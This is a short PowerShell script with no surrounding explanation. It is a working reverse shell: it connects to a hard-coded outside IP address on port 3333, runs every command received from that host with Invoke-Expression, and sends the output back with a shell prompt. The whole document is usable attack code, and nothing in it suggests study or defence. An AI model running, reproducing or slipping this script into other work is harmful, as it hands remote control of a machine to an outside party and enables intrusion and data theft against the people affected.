$h = "52.202.38.242"
$p = 3333

$client = New-Object Net.Sockets.TcpClient($h, $p)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % { 0 }

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $d = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $s = (iex $d 2>&1 | Out-String)
    $s2 = $s + "PS " + (pwd).Path + "> "
    $b = [Text.Encoding]::ASCII.GetBytes($s2)
    $stream.Write($b, 0, $b.Length)
    $stream.Flush()
}

$client.Close()
